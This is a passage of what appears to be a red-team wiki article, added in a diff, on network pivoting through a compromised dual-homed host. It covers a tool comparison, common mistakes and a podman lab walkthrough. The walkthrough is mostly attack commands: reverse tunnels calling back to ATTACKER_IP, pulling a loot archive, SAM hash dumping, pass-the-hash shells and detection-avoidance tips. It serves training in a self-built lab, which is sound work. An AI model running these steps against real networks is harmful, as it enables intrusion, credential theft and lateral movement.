+scp -o &#34;ProxyCommand=nc -x 127.0.0.1:1080 %h %p&#34; \
+    file.txt root@10.0.0.50:/tmp/
+
+# Using ProxyJump (SSH to Host A, then to Host B):
+scp -o &#34;ProxyJump=root@192.168.1.10&#34; file.txt root@10.0.0.50:/tmp/
+
+# Using -J flag:
+scp -J root@192.168.1.10 file.txt root@10.0.0.50:/tmp/
+						</pre>
+						<pre class="bash">
+# HTTP-based file transfer through proxychains:
+# On the internal host, start an HTTP server:
+proxychains4 ssh root@10.0.0.50 &#34;cd /tmp &amp;&amp; python3 -m http.server 8080&#34;
+
+# On attacker, download through proxychains:
+proxychains4 curl -O http://10.0.0.50:8080/loot.tar.gz
+
+# Or upload a file:
+proxychains4 curl -T chisel_linux_amd64 http://10.0.0.50:8080/
+						</pre>
+					</section>
+					<section>
+						<h3 id="pivoting-tools-comparison">Pivoting Tools Comparison</h3>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Tool</th>
+									<th align="center">Type</th>
+									<th align="center">Protocols</th>
+									<th align="center">Speed</th>
+									<th align="center">Setup Complexity</th>
+									<th align="center">Requires Outbound Port</th>
+									<th align="center">OPSEC</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><b>SSH -D</b></td>
+									<td align="center">SOCKS5 (TCP only)</td>
+									<td align="center">TCP</td>
+									<td align="center">Medium</td>
+									<td align="center">Low - single command</td>
+									<td align="center">TCP 22 outbound</td>
+									<td align="center">Good - standard SSH traffic</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Chisel</b></td>
+									<td align="center">SOCKS5 (TCP only) over HTTP/HTTPS</td>
+									<td align="center">TCP</td>
+									<td align="center">Medium</td>
+									<td align="center">Low - two commands</td>
+									<td align="center">TCP 443 (configurable)</td>
+									<td align="center">Excellent - looks like HTTPS/WebSocket</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Ligolo-ng</b></td>
+									<td align="center">TUN (Layer 3 - all protocols)</td>
+									<td align="center">TCP, UDP, ICMP, raw sockets</td>
+									<td align="center">High - native network stack</td>
+									<td align="center">Medium - TUN setup</td>
+									<td align="center">TCP 11601 (configurable)</td>
+									<td align="center">Good - TLS-encrypted custom protocol</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Metasploit route</b></td>
+									<td align="center">Meterpreter channel + SOCKS5</td>
+									<td align="center">TCP</td>
+									<td align="center">Slow for scans, normal for exploits</td>
+									<td align="center">Medium - requires meterpreter session</td>
+									<td align="center">Same as meterpreter (TCP 4444)</td>
+									<td align="center">Depends on payload</td>
+								</tr>
+								<tr>
+									<td align="center"><b>sshuttle</b></td>
+									<td align="center">TUN-like (iptables + SSH)</td>
+									<td align="center">TCP, DNS</td>
+									<td align="center">High</td>
+									<td align="center">Low - one command, no agent needed</td>
+									<td align="center">TCP 22 outbound</td>
+									<td align="center">Good - standard SSH traffic</td>
+								</tr>
+								<tr>
+									<td align="center"><b>rpivot</b></td>
+									<td align="center">SOCKS4 (TCP only)</td>
+									<td align="center">TCP</td>
+									<td align="center">Medium</td>
+									<td align="center">Medium - Python-based</td>
+									<td align="center">TCP 9999 (configurable)</td>
+									<td align="center">Fair - cleartext SOCKS, identifiable Python traffic</td>
+								</tr>
+								<tr>
+									<td align="center"><b>dnscat2 / iodine</b></td>
+									<td align="center">DNS tunnel (IP over DNS)</td>
+									<td align="center">All (encapsulated in DNS)</td>
+									<td align="center">Very slow - DNS overhead</td>
+									<td align="center">High - DNS record configuration</td>
+									<td align="center">DNS outbound (UDP 53)</td>
+									<td align="center">Fair - high volume of DNS queries is anomalous</td>
+								</tr>
+								<tr>
+									<td align="center"><b>3proxy</b></td>
+									<td align="center">SOCKS5 / HTTP proxy</td>
+									<td align="center">TCP</td>
+									<td align="center">Medium</td>
+									<td align="center">Medium - compile + config</td>
+									<td align="center">TCP 1080 (configurable)</td>
+									<td align="center">Fair - cleartext SOCKS</td>
+								</tr>
+							</tbody>
+						</table>
+						<pre class="bash">
+# sshuttle — transparent proxy through SSH
+# Does not require an agent on the compromised host. Uses iptables
+# on the attacker to route traffic through an SSH pipe.
+sudo sshuttle -r root@192.168.1.10 10.0.0.0/24
+
+# -r : remote host (the pivot)
+# 10.0.0.0/24 : subnet to route through the pivot
+# sshuttle creates a Python script on the remote, runs it, and uses
+# iptables to redirect traffic for 10.0.0.0/24 through the SSH tunnel.
+
+# After sshuttle starts, all traffic to 10.0.0.0/24 is transparently routed:
+ping 10.0.0.50
+nmap -sS 10.0.0.50
+curl http://10.0.0.50
+# No proxychains needed. No SOCKS configuration. It just works.
+						</pre>
+					</section>
+					<section>
+						<h3 id="common-mistakes">Common Mistakes</h3>
+						<p>
+							<b>Forgetting to enable 'proxy_dns' in proxychains.</b>
+							Without
+							<code>proxy_dns</code>
+							,
+							<abbr title="Domain Name System">DNS</abbr>
+							queries leak to your local resolver and fail for internal hostnames. With
+							<code>proxy_dns</code>
+							, proxychains
+							intercepts
+							<code>gethostbyname()</code>
+							calls and tunnels the
+							<abbr title="Domain Name System">DNS</abbr>
+							query through the
+							proxy. If you see
+							<code>Could not resolve hostname</code>
+							despite the host being reachable, check your
+							proxychains config.
+						</p>
+						<p>
+							<b>Using the wrong nmap scan type through SOCKS.</b>
+							
+							<abbr title="Synchronize">SYN</abbr>
+							scan (
+							<code>-sS</code>
+							) through
+							<code>SOCKS</code>
+							will fail silently or hang. Always use
+							<code>-sT</code>
+							(
+							<abbr title="Transmission Control Protocol">TCP</abbr>
+							Connect) when scanning through a
+							<code>SOCKS</code>
+							proxy. Through a TUN (ligolo-ng), all scan types work.
+						</p>
+						<p>
+							<b>Running chisel client as root on the pivot host.</b>
+							Not necessary. Chisel does not need root
+							privileges for a
+							<code>SOCKS</code>
+							proxy. It only needs outbound network access. Running as root is a
+							detection risk (creates a root-process audit trail). Use the lowest-privileged user available.
+						</p>
+						<p>
+							<b>Overloading the pivot with too many parallel connections.</b>
+							
+							<code>SOCKS</code>
+							proxies handle one
+							<abbr title="Transmission Control Protocol">TCP</abbr>
+							stream per connection. Running nmap with
+							<code>--min-parallelism 100</code>
+							through a single
+							<abbr title="Secure Shell">SSH</abbr>
+							<code>-D</code>
+							connection will overwhelm the
+							<abbr title="Secure Shell">SSH</abbr>
+							multiplexer and cause timeouts. Limit
+							parallelism to 10-20 connections, or use ligolo-ng TUN which benefits from the kernel's
+							<abbr title="Transmission Control Protocol">TCP</abbr>
+							stack.
+						</p>
+						<p>
+							<b>Not documenting routes.</b>
+							Multi-hop pivots create complex routing chains. Without documentation,
+							you will lose track of which local port routes to which network. Write it down immediately.
+							The engagement notes are your map - without them, you are navigating blind.
+						</p>
+						<p>
+							<b>Assuming internal DNS works from the attacker machine.</b>
+							When you pivot, the pivot host resolves
+							<abbr title="Domain Name System">DNS</abbr>
+							using ITS resolver, not yours. If the pivot host uses an internal
+							<abbr title="Domain Name System">DNS</abbr>
+							server (e.g., a
+							<abbr title="Domain Controller">DC</abbr>
+							at 10.0.0.1), hostnames like
+							<code>fileserver.corp.local</code>
+							resolve, but your attacker machine cannot resolve them unless you configure
+							proxychains
+							<code>proxy_dns</code>
+							or use the pivot host's
+							<abbr title="Domain Name System">DNS</abbr>
+							server explicitly:
+						</p>
+						<pre class="bash">
+# Through the pivot, query the internal DNS server
+proxychains4 dig @10.0.0.1 fileserver.corp.local
+						</pre>
+						<p>
+							<b>Cleaning up TUN interfaces after engagement.</b>
+							Leaving TUN interfaces and routes active on
+							your attacker machine causes traffic leakage and connectivity issues in subsequent scans. Clean
+							up:
+						</p>
+						<pre class="bash">
+sudo ip link del ligolo
+sudo ip route del 10.0.0.0/24 || true
+						</pre>
+					</section>
+					<section>
+						<h3 id="challenge">Challenge</h3>
+						<p>
+							Build the pivot and the internal target, reach the internal host at 10.0.0.50 through the pivot,
+							and enumerate its
+							<abbr title="Server Message Block">SMB</abbr>
+							shares. Use chisel and ligolo-ng, then document
+							every route.
+						</p>
+						<p><a href="/wiki/articles/redteam/pivoting.Containerfile">pivoting.Containerfile</a></p>
+						<pre class="bash">
+# 1. Create the external and internal networks:
+podman network create --subnet 192.168.1.0/24 external-net
+podman network create --subnet 10.0.0.0/24 --internal internal-net
+
+# 2. Build the pivot and the internal target:
+podman build -t pivoting-lab-pivot -f pivoting.Containerfile --build-arg ROLE=pivot .
+podman build -t pivoting-lab-internal -f pivoting.Containerfile --build-arg ROLE=internal .
+
+# 3. Run the internal target first, then the dual-homed pivot:
+podman run -d --name internal-target --network internal-net --ip 10.0.0.50 pivoting-lab-internal
+podman run -d --name pivot-host --network external-net --ip 192.168.1.10 -p 2222:22 pivoting-lab-pivot
+podman network connect internal-net pivot-host --ip 10.0.0.10
+
+# 4. SSH into the pivot and confirm the internal host is reachable:
+ssh root@localhost -p 2222   # password: redteam
+ping -c 2 10.0.0.50
+
+# 5. Cleanup:
+podman stop pivot-host internal-target
+podman rm pivot-host internal-target
+podman network rm external-net internal-net
+						</pre>
+						<p>This lab simulates a compromised web server with dual-homed networking.</p>
+						<p>
+							<b>Scenario</b>
+							: You have compromised a web server at 192.168.1.10 via an
+							<abbr title="Secure Shell">SSH</abbr>
+							credential. The server has a second
+							<abbr title="Network Interface Card">NIC</abbr>
+							on 10.0.0.0/24. An internal
+							host at 10.0.0.50 runs
+							<abbr title="Server Message Block">SMB</abbr>
+							and
+							<abbr title="Secure Shell">SSH</abbr>
+							and is otherwise
+							unreachable from the internet.
+						</p>
+						<h4 id="phase-1-compromise-the-pivot-host">Phase 1 - Compromise the Pivot Host</h4>
+						<pre class="bash">
+# SSH access to the compromised web server
+ssh root@192.168.1.10
+# (Credential obtained via prior exploitation — not covered here)
+
+# Discover internal networks from the pivot host
+hostname
+
+# Enumerate network interfaces
+ip addr show
+# 1: eth0: 192.168.1.10/24  (external — reachable by attacker)
+# 2: eth1: 10.0.0.10/24     (internal — NOT reachable by attacker)
+
+# Enumerate routing table
+ip route show
+# default via 192.168.1.1 dev eth0
+# 10.0.0.0/24 dev eth1 proto kernel scope link src 10.0.0.10
+
+# The pivot host can reach 10.0.0.0/24. Check connectivity:
+ping -c 2 10.0.0.50
+# 64 bytes from 10.0.0.50: icmp_seq=1 ttl=64 time=0.5ms
+
+# Quick ARP scan of the internal subnet (from pivot host)
+for ip in $(seq 1 254); do
+    (ping -c 1 -W 1 10.0.0.$ip &gt; /dev/null 2&gt;&amp;1 &amp;&amp; echo &#34;10.0.0.$ip: ALIVE&#34;) &amp;
+done | sort -t. -k4 -n &gt; internal-hosts.txt
+wait
+cat internal-hosts.txt
+# 10.0.0.1: ALIVE   (internal gateway)
+# 10.0.0.10: ALIVE  (self)
+# 10.0.0.50: ALIVE  (target internal host)
+
+# Exit the pivot host
+exit
+						</pre>
+						<h4 id="phase-2-set-up-the-pivot-with-chisel">Phase 2 - Set Up the Pivot with Chisel</h4>
+						<pre class="bash">
+# On the ATTACKER — start chisel server
+chisel server -p 443 --reverse --socks5
+# [server] Listening on http://0.0.0.0:443
+
+# Upload chisel to the pivot host (already compiled for Linux amd64)
+scp chisel root@192.168.1.10:/tmp/chisel
+
+# On the PIVOT HOST — connect back to attacker
+ssh root@192.168.1.10
+chmod +x /tmp/chisel
+/tmp/chisel client ATTACKER_IP:443 R:1080:socks &amp;
+
+# Verify the client connected:
+# Attacker terminal shows: [server] session 1: tun
+# SOCKS proxy now available on attacker&#39;s localhost:1080
+						</pre>
+						<h4 id="phase-3-scan-internal-network">Phase 3 - Scan Internal Network</h4>
+						<pre class="bash">
+# On the ATTACKER — configure proxychains
+# Already configured: /etc/proxychains4.conf → socks5 127.0.0.1 1080
+
+# Port scan the internal host through the SOCKS proxy
+proxychains4 nmap -sT -Pn -n -p 22,80,445,3389,1433,3306,5985,5986 10.0.0.50
+
+# Expected output:
+# PORT     STATE  SERVICE
+# 22/tcp   open   ssh
+# 445/tcp  open   microsoft-ds
+# 3389/tcp closed ms-wbt-server
+# 5985/tcp closed wsman
+
+# The internal host at 10.0.0.50 exposes SSH (22) and SMB (445).
+						</pre>
+						<h4 id="phase-4-internal-services">Phase 4 - Internal Services</h4>
+						<pre class="bash">
+# Check SMB access on the internal host
+proxychains4 crackmapexec smb 10.0.0.50
+
+# SMB enumeration
+proxychains4 crackmapexec smb 10.0.0.50 --shares
+
+# If we have credentials:
+proxychains4 crackmapexec smb 10.0.0.50 -u jsmith -p &#39;password&#39; -d corp.local
+
+# Execute a command on the internal host
+proxychains4 crackmapexec smb 10.0.0.50 -u jsmith -p &#39;password&#39; -d corp.local \
+    -x &#39;ipconfig /all&#39;
+
+# Dump SAM hashes
+proxychains4 secretsdump.py corp.local/jsmith:password@10.0.0.50
+						</pre>
+						<h4 id="phase-5-compromise-the-internal-host">Phase 5 - Compromise the Internal Host</h4>
+						<pre class="bash">
+# Obtain an interactive shell on the internal host via PtH
+# (assuming we extracted the NTLM hash in Phase 4)
+proxychains4 psexec.py -hashes :ntlm_hash corp.local/administrator@10.0.0.50
+
+# Or via WinRM (if enabled)
+proxychains4 evil-winrm -i 10.0.0.50 -u administrator -H ntlm_hash
+
+# From the shell on 10.0.0.50, continue the engagement:
+# - Enumerate its network interfaces (may have a third NIC on 172.16.0.0/24)
+# - Set up a SECOND pivot with chisel/ligolo-ng for the third network
+# - Document the multi-hop topology in your engagement notes
+						</pre>
+						<h4 id="phase-6-ligolo-ng-walkthrough">Phase 6 - Ligolo-ng Walkthrough</h4>
+						<pre class="bash">
+# On the ATTACKER — setup ligolo-ng
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+sudo ip addr add 10.0.0.99/24 dev ligolo
+ligolo-proxy -selfcert
+
+# Upload ligolo-agent to pivot host
+scp ligolo-agent root@192.168.1.10:/tmp/
+
+# On the PIVOT HOST — connect agent
+ssh root@192.168.1.10
+/tmp/ligolo-agent -connect ATTACKER_IP:11601 -ignore-cert &amp;
+
+# On the ATTACKER — in ligolo proxy terminal:
+ligolo-ng » session
+ligolo-ng » ip route add 10.0.0.0/24
+ligolo-ng » start
+
+# Now scan the internal network at full speed — no proxychains needed
+sudo nmap -sS -sV -p 22,80,445,1433,3306,5985,5986 10.0.0.0/24
+
+# Direct SMB access (the ligolo TUN routes traffic natively)
+crackmapexec smb 10.0.0.50 -u jsmith -p &#39;password&#39; -d corp.local
+psexec.py corp.local/jsmith:password@10.0.0.50
+						</pre>
+					</section>
+					<section>
+						<h3 id="references">References</h3>
+						<ul>
+							<li><a class="icon-website" href="https://attack.mitre.org/techniques/T1090/003/" target="_blank">MITRE ATT&CK - Proxy: Multi-hop Proxy (T1090.003)</a></li>
+							<li><a class="icon-website" href="https://attack.mitre.org/techniques/T1572/" target="_blank">MITRE ATT&CK - Protocol Tunneling (T1572)</a></li>
+							<li><a class="icon-website" href="https://man.openbsd.org/ssh.1" target="_blank">OpenSSH manual: ssh(1)</a> - <code>-D</code> dynamic forwarding and <code>-L</code> / <code>-R</code> tunnels</li>
+							<li><a class="icon-github" href="https://github.com/rofl0r/proxychains-ng" target="_blank">proxychains-ng</a> - force <abbr title="Transmission Control Protocol">TCP</abbr> through <code>SOCKS</code> proxies</li>
+							<li><a class="icon-github" href="https://github.com/jpillora/chisel" target="_blank">chisel - fast TCP/UDP tunnel over HTTP</a></li>
+							<li><a class="icon-github" href="https://github.com/nicocha30/ligolo-ng" target="_blank">ligolo-ng - TUN-based pivoting agent and proxy</a></li>
+							<li><a class="icon-website" href="https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting.html" target="_blank">Metasploit: route and socks_proxy</a></li>
+							<li><a class="icon-github" href="https://github.com/sshuttle/sshuttle" target="_blank">sshuttle - transparent proxy over SSH</a></li>
+						</ul>
+					</section>
+				</article>
+			</main>
+		</div>
+
+		<footer>
+			<div></div>
+			<div class="print-not">Made with 💔 in Germany. &copy; Cookie Engineer (https://cookie.engineer). All rights (and jokes) reserved under European Law.</div>
+			<div></div>
+		</footer>
+
+	</body>
+</html>
